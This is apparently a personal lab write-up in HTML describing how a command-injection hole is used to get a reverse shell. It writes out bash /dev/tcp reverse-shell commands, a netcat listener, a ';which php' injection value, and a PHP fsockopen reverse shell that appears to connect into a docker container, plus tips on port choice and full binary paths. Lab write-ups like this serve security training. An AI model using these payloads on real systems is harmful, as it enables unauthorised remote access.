<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Pop a shell</title>
</head><body>Let's see if we can pop a shell<br/>
<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md</a><br/>
<br/>
Will try the Bash TCP:<br/>
Commnad :bash -i &gt;&amp; /dev/tcp/10.0.0.1/4242 0&gt;&amp;1<br/>
<br/>
but to know the bash path will run the command<br/>
which/bash<br/>
<img height="237" src="image.png" width="800"/><br/>
got the path for the bash<br/>
our IP address for now : 192.168.17.133<br/>
Commnad :/bin/bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1<br/>
<br/>
<img height="213" src="image 2.png" width="650"/><br/>
WIll set up a listner:<br/>
nc -nlvp 4444<br/>
<br/>
But it didn't work as we didn't got the shell as of now.<br/>
Some best practices for trying to get Shell to work when we have command injection is to try full paths to the binaries.<br/>
<br/>
Also using ports like 4444 sometimes fails as well so try and stick to common ports like 80 or 8080 or 443<br/>
<br/>
As always our 1st payload might not work so have to try few different ones.<br/>
<br/>
The fact this refreshed straight away and gave us a resposne is an indication that we didn't unfortunately get anything back.<br/>
<br/>
Will check which other things are running on the box (i.e. php,python in our case)<br/>
we don't have python installed <br/>
<br/>
Command : ;which php; asd<br/>
<img height="228" src="image 3.png" width="750"/><br/>
Command For reverse Shell : php -r '$sock=fsockopen(&quot;192.168.17.133&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'<br/>
<img height="216" src="image 4.png" width="700"/><br/>
The fact that it's hung is actually a really good sign that it's probably connected back to us.<br/>
<br/>
<br/>
<img src="image 5.png"/><br/>
<br/>
We can see from the hostname that we are probably inside the docker.<br/>
<img src="image 6.png"/><br/>
<br/>
<br/>
<br/>
</body></html>